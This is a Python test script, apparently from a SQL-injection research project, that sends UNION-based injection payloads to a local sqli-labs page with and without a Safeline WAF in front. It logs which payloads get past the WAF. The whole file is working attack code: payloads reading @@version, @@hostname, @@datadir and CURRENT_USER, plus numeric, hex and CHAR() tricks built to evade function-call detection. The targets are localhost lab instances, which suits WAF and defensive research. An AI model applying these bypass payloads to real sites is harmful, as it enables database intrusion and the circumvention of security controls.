"""
bypass_lab/test_sysvars.py
===========================
Safeline blocks identifier() pattern.
@@variable has NO parentheses — might bypass function-call detection.
CURRENT_USER, CURRENT_DATE, etc. also have no parens.

Also test: numeric-only bypass (no strings needed) for formal verification.

Run:
    python3 -m bypass_lab.test_sysvars
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"
FOUND = []


def t(label, payload):
    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
    rw = requests.get(WAF,   params={"id": payload}, timeout=8)

    plain_ok  = classify_response(rp.text, rp.status_code, "union",
                                  strict_markers=True) == "SUCCESS"
    plain_err = "syntax" in rp.text.lower() or "error" in rp.text.lower()
    # Check for ANY data returned (numeric or string)
    login_idx = rp.text.find("Your Login name:")
    plain_data = rp.text[login_idx+16:login_idx+50].strip() if login_idx >= 0 else ""

    waf_ok    = classify_response(rw.text, rw.status_code, "union",
                                  strict_markers=True) == "SUCCESS"
    waf_pass  = rw.status_code != 403
    waf_data  = ""
    if waf_pass and not waf_ok:
        li = rw.text.find("Your Login name:")
        waf_data = rw.text[li+16:li+50].strip() if li >= 0 else ""

    p_tag = "OK" if plain_ok else ("ERR" if plain_err else "NODATA")
    w_tag = "*** BYPASS ***" if waf_ok else ("PASS" if waf_pass else "BLOCK")

    data_info = f"plain_got={repr(plain_data[:20])}" if plain_data else ""
    wdata_info = f"waf_got={repr(waf_data[:20])}" if waf_data else ""
    print(f"  plain={p_tag:<8} waf={w_tag:<16} | {label}")
    if plain_data or waf_data:
        print(f"    {data_info} {wdata_info}")
    if waf_ok:
        FOUND.append(("BYPASS", label, payload))
        print(f"    {payload[:100]}")
    elif waf_pass:
        FOUND.append(("PASS", label, payload))
    time.sleep(0.3)


BASE   = ".1-- -'/0 UNION ALL SELECT"
BASE2  = ".1-- -' UNION ALL SELECT"    # tanpa /0


print("=" * 65)
print(" @@variables (no parentheses) + numeric marker bypass")
print("=" * 65)

# ── 1. @@variable di column 2, angka di col1 dan col3 ────────────────
print("\n[1] @@variable sebagai column 2 (tanpa parens)")
for var in ["@@version", "@@hostname", "@@datadir", "@@basedir",
            "@@global.version", "@@session.version",
            "CURRENT_USER", "CURRENT_DATE", "CURRENT_TIMESTAMP",
            "USER", "DATABASE", "SCHEMA"]:
    t(f"col2={var}",
      f"{BASE} 1,{var},2-- -")
    t(f"col2={var} no/0",
      f"{BASE2} 1,{var},2-- -")

# ── 2. Numeric markers — tanpa string sama sekali ─────────────────────
print("\n[2] Pure numeric markers (99999 dan 88888)")
t("numeric 99999,88888 +quote",
  ".1-- -'/0 UNION ALL SELECT 1,99999,88888'")
t("numeric 99999,88888 +-- -",
  ".1-- -'/0 UNION ALL SELECT 1,99999,88888-- -")
t("numeric 99999,88888 no/0",
  ".1-- -' UNION ALL SELECT 1,99999,88888-- -")
t("numeric berbeda setiap test",
  ".1-- -'/0 UNION ALL SELECT 12345,67890,11111'")

# ── 3. Arithmetic expressions ─────────────────────────────────────────
print("\n[3] Arithmetic di col2 (tanpa fungsi)")
t("col2=1+1",       f"{BASE} 1,1+1,2-- -")
t("col2=2*2",       f"{BASE} 1,2*2,2-- -")
t("col2=100-1",     f"{BASE} 1,100-1,2-- -")
t("col2=0xABCD",    f"{BASE} 1,0xABCD,2-- -")
t("col2=2<<10",     f"{BASE} 1,2<<10,2-- -")   # bitshift = 2048
t("col2=~0",        f"{BASE} 1,~0,2-- -")       # max bigint

# ── 4. Combine @@var dengan bypass trick ─────────────────────────────
print("\n[4] @@var + suffix quote trick (user pattern)")
for var in ["@@version", "@@hostname", "CURRENT_USER"]:
    t(f"{var} + quote end",
      f".1-- -'/0 UNION ALL SELECT 1,{var},2'")
    t(f"{var} + /NULL instead of /0",
      f".1-- -'/NULL UNION ALL SELECT 1,{var},2-- -")

# ── 5. Dengan /NULL bukan /0 (hindari division by zero error) ─────────
print("\n[5] /NULL sebagai pengganti /0 (no strict mode error)")
t("hex markers + /NULL",
  ".1-- -'/NULL UNION ALL SELECT 1,0x534551534c495f5354415254,0x534551534c495f454e44-- -")
t("CHAR + /NULL",
  ".1-- -'/NULL UNION ALL SELECT 1,CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84),CHAR(83,69,81,83,81,76,73,95,69,78,68)-- -")
t("numeric + /NULL",
  ".1-- -'/NULL UNION ALL SELECT 1,99999,88888-- -")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 65)
bypasses = [x for x in FOUND if x[0] == "BYPASS"]
passes   = [x for x in FOUND if x[0] == "PASS"]
print(f" BYPASS (strict markers): {len(bypasses)}")
print(f" WAF PASS (need verify):  {len(passes)}")
for tag, label, p in FOUND:
    print(f"\n  [{tag}] {label}")
    print(f"  {p[:110]}")
